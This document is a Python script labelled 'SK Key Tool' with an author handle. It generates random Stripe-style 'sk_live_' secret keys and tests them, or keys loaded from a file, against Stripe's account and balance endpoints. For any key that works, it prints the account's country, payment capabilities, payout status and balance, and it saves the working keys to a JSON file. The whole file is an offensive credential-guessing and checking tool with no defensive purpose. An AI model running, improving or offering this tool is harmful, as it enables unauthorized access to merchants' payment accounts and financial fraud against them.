import random
import string
import json
import os
import time
import requests

from keep_alive import keep_alive
keep_alive()

def generate_sk_key_body(length=99):
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def generate_keys(count):
    keys = []
    for _ in range(count):
        key = "sk_live_" + generate_sk_key_body()
        keys.append(key)
    return keys

def save_keys_to_txt(keys, filename="sk.txt"):
    with open(filename, "w") as f:
        for key in keys:
            f.write(key + "\n")

def load_keys_from_txt(filename="sk.txt"):
    if not os.path.exists(filename):
        print("sk.txt file not found!")
        return []
    with open(filename, "r") as f:
        return [line.strip() for line in f.readlines() if line.strip()]

def check_sk_key(key):
    start = time.time()
    headers = {
        "Authorization": f"Bearer {key}"
    }
    try:
        response = requests.get("https://api.stripe.com/v1/account", headers=headers, timeout=10)
        if response.status_code == 200:
            acc = response.json()
            balance = requests.get("https://api.stripe.com/v1/balance", headers=headers)
            bal = balance.json() if balance.status_code == 200 else {}

            end = time.time()
            print(f"\n━━━━━━━━━━━━━━━━━━━━━━━━")
            print(f"  ✅ 𝐒𝐭𝐚𝐭𝐮𝐬 ↯ LIVE")
            print(f"  𝐌𝐨𝐝𝐞 ↯ {acc.get('settings', {}).get('dashboard', {}).get('display_name', 'N/A')}")
            print(f"  𝐈𝐧𝐭𝐞𝐠𝐫𝐚𝐭𝐢𝐨𝐧 ↯ {acc.get('settings', {}).get('payments', {}).get('statement_descriptor', 'N/A')}")
            print(f"  𝐀𝐜𝐜𝐨𝐮𝐧𝐭 𝐓𝐲𝐩𝐞 ↯ {acc.get('type', 'N/A')}")
            print(f"  𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ {acc.get('country', 'N/A')}")
            print(f"  𝐂𝐮𝐫𝐫𝐞𝐧𝐜𝐲 ↯ {acc.get('default_currency', 'N/A')}")
            print(f"  𝐂𝐚𝐩𝐚𝐛𝐢𝐥𝐢𝐭𝐢𝐞𝐬 ↯ {', '.join(acc.get('capabilities', {}).keys())}")
            print(f"  𝐂𝐚𝐫𝐝 𝐏𝐚𝐲𝐦𝐞𝐧𝐭𝐬 ↯ {acc.get('capabilities', {}).get('card_payments', 'N/A')}")
            print(f"  𝐓𝐫𝐚𝐧𝐬𝐟𝐞𝐫𝐬 ↯ {acc.get('capabilities', {}).get('transfers', 'N/A')}")
            print(f"  𝐂𝐡𝐚𝐫𝐠𝐞𝐬 𝐄𝐧𝐚𝐛𝐥𝐞𝐝 ↯ {acc.get('charges_enabled', 'N/A')}")
            print(f"  𝐏𝐚𝐲𝐨𝐮𝐭𝐬 𝐄𝐧𝐚𝐛𝐥𝐞𝐝 ↯ {acc.get('payouts_enabled', 'N/A')}")
            print(f"  𝐁𝐚𝐥𝐚𝐧𝐜𝐞 ↯ 𝐀𝐯𝐚𝐢𝐥𝐚𝐛𝐥𝐞 ↯ {bal.get('available', [{}])[0].get('amount', 'N/A')} {bal.get('available', [{}])[0].get('currency', 'N/A')}")
            print(f"  𝐏𝐞𝐧𝐝𝐢𝐧𝐠 ↯ {bal.get('pending', [{}])[0].get('amount', 'N/A')} {bal.get('pending', [{}])[0].get('currency', 'N/A')}")
            print(f"  𝐓𝐢𝐦𝐞 ↯ {round(end - start, 2)} sec")
            print(f"━━━━━━━━━━━━━━━━━━━━━━━━\n")
            return True
        else:
            print(f"\n❌ 𝐒𝐭𝐚𝐭𝐮𝐬 ↯ DEAD for {key}")
            return False
    except Exception as e:
        print(f"❌ Error checking {key}: {e}")
        return False

def save_live_keys_json(live_keys, filename="sklive.json"):
    data = [{"sk_key": k, "status": "Live"} for k in live_keys]
    with open(filename, "w") as f:
        json.dump(data, f, indent=4)

# Header
print("━━━━━━━━━━━━━━━━━━━━━━━━")
print("      SK Key Tool")
print("     Made By @Darkboy22")
print("━━━━━━━━━━━━━━━━━━━━━━━━\n")

cmd = input("Type command (gen/check): ").strip().lower()

if cmd == "gen":
    try:
        count = int(input("How many SK keys you want to generate? "))
        generated_keys = generate_keys(count)
        save_keys_to_txt(generated_keys)
        print(f"\n{count} SK keys saved to sk.txt")
    except ValueError:
        print("Invalid number!")

elif cmd == "check":
    all_keys = load_keys_from_txt()
    if not all_keys:
        exit()
    live_keys = []
    for k in all_keys:
        if check_sk_key(k):
            live_keys.append(k)
    save_live_keys_json(live_keys)
    print(f"\nTotal {len(live_keys)} LIVE keys saved to sklive.json")

else:
    print("Unknown command! Use 'gen' or 'check'")
